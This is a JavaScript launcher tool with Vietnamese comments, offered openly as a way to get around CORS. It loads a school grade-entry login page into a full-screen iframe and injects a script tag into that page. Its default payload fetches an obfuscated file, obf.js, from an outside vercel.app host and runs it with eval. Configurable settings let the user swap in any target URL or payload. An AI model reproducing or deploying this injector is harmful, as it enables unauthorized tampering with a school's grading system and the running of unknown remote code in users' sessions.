// ============================================================
// NT4NH2 // LAUNCHER SCRIPT (IFRAME INJECTION METHOD)
// Lách CORS bằng cách nhúng trang đích vào iframe và tiêm script
// ============================================================

const DEFAULT_CONFIG = {
  targetUrl: "https://nhapdiem.truonghocviet.vn/Account/Login",
  payload: "fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
  delay: 1500,
  title: "Launcher Tool",
  bg: "#0d1117",
  text: "#c9d1d9"
};

function loadConfig() {
  const raw = localStorage.getItem("launcher_config");
  if (!raw) return { ...DEFAULT_CONFIG };
  try { return { ...DEFAULT_CONFIG, ...JSON.parse(raw) }; }
  catch (e) { return { ...DEFAULT_CONFIG }; }
}

function saveConfig(cfg) {
  localStorage.setItem("launcher_config", JSON.stringify(cfg));
}

let CONFIG = loadConfig();

function applyWebSettings() {
  document.title = CONFIG.title;
  document.body.style.background = CONFIG.bg;
  document.body.style.color = CONFIG.text;
}

const btnLaunch     = document.getElementById("btnLaunch");
const btnSettingTool= document.getElementById("btnSettingTool");
const btnSettingWeb = document.getElementById("btnSettingWeb");
const statusEl      = document.getElementById("status");

const popup         = document.getElementById("popup");
const btnReinject   = document.getElementById("btnReinject");
const btnClose      = document.getElementById("btnClose");

const settingTool   = document.getElementById("settingTool");
const inpTargetUrl  = document.getElementById("inpTargetUrl");
const inpPayload    = document.getElementById("inpPayload");
const inpDelay      = document.getElementById("inpDelay");
const btnSaveTool   = document.getElementById("btnSaveTool");
const btnCloseTool  = document.getElementById("btnCloseTool");

const settingWeb    = document.getElementById("settingWeb");
const inpTitle      = document.getElementById("inpTitle");
const inpBg         = document.getElementById("inpBg");
const inpText       = document.getElementById("inpText");
const btnSaveWeb    = document.getElementById("btnSaveWeb");
const btnCloseWeb   = document.getElementById("btnCloseWeb");

let watchTimer = null;
let popupShown = false;
let currentIframe = null;

function setStatus(msg) {
  statusEl.textContent = "Trạng thái: " + msg;
}

// Kỹ thuật Inject lách CORS
function launchTool() {
  popupShown = false;
  setStatus("Đang khởi tạo môi trường Inject...");

  // Xóa iframe cũ nếu có
  if (currentIframe) {
    currentIframe.remove();
  }

  // Tạo iframe ẩn để load trang đích
  currentIframe = document.createElement("iframe");
  currentIframe.style.width = "100vw";
  currentIframe.style.height = "100vh";
  currentIframe.style.position = "fixed";
  currentIframe.style.top = "0";
  currentIframe.style.left = "0";
  currentIframe.style.zIndex = "9999";
  currentIframe.style.background = "#fff";
  currentIframe.style.border = "none";
  
  // Gắn iframe vào body
  document.body.appendChild(currentIframe);

  // Chờ iframe tải xong
  currentIframe.onload = () => {
    setStatus("Đã tải iframe. Đang tiến hành tiêm mã...");
    
    setTimeout(() => {
      try {
        // Lấy document của iframe
        const iframeDoc = currentIframe.contentWindow.document;
        
        // Tạo thẻ script chứa payload
        const script = iframeDoc.createElement("script");
        script.textContent = CONFIG.payload;
        
        // Chèn vào thẻ head của trang đích bên trong iframe
        iframeDoc.head.appendChild(script);
        
        setStatus("Inject thành công. Đang giám sát...");
      } catch (e) {
        // Nếu trang đích có header X-Frame-Options hoặc CSP chặn iframe
        console.error("Lỗi Inject:", e);
        setStatus("Lỗi: Trang đích chặn iframe hoặc CORS.");
        onToolClosed();
      }
      startWatch();
    }, CONFIG.delay);
  };

  // Load URL đích vào iframe
  currentIframe.src = CONFIG.targetUrl;
}

function startWatch() {
  stopWatch();
  watchTimer = setInterval(() => {
    // Kiểm tra nếu iframe bị xóa hoặc không còn tồn tại
    if (!currentIframe || !document.body.contains(currentIframe)) {
      stopWatch();
      onToolClosed();
    }
  }, 1000);
}

function stopWatch() {
  if (watchTimer) { clearInterval(watchTimer); watchTimer = null; }
}

function onToolClosed() {
  setStatus("Tool đã ngắt.");
  if (!popupShown) {
    popupShown = true;
    popup.classList.remove("hidden");
  }
}

btnLaunch.addEventListener("click", launchTool);

btnSettingTool.addEventListener("click", () => {
  inpTargetUrl.value = CONFIG.targetUrl;
  inpPayload.value   = CONFIG.payload;
  inpDelay.value     = CONFIG.delay;
  settingTool.classList.remove("hidden");
});

btnSettingWeb.addEventListener("click", () => {
  inpTitle.value = CONFIG.title;
  inpBg.value    = CONFIG.bg;
  inpText.value  = CONFIG.text;
  settingWeb.classList.remove("hidden");
});

btnSaveTool.addEventListener("click", () => {
  CONFIG.targetUrl = inpTargetUrl.value.trim();
  CONFIG.payload   = inpPayload.value.trim();
  CONFIG.delay     = parseInt(inpDelay.value) || 1500;
  saveConfig(CONFIG);
  settingTool.classList.add("hidden");
  setStatus("Đã lưu setting tool.");
});

btnSaveWeb.addEventListener("click", () => {
  CONFIG.title = inpTitle.value.trim() || "Launcher Tool";
  CONFIG.bg    = inpBg.value;
  CONFIG.text  = inpText.value;
  saveConfig(CONFIG);
  applyWebSettings();
  settingWeb.classList.add("hidden");
  setStatus("Đã lưu setting web.");
});

btnCloseTool.addEventListener("click", () => settingTool.classList.add("hidden"));
btnCloseWeb .addEventListener("click", () => settingWeb.classList.add("hidden"));

btnReinject.addEventListener("click", () => {
  popup.classList.add("hidden");
  launchTool();
});

btnClose.addEventListener("click", () => {
  popup.classList.add("hidden");
  if (currentIframe) {
    currentIframe.remove();
    currentIframe = null;
  }
  setStatus("Đã hủy inject lại.");
});

applyWebSettings();
setStatus("Sẵn sàng.");
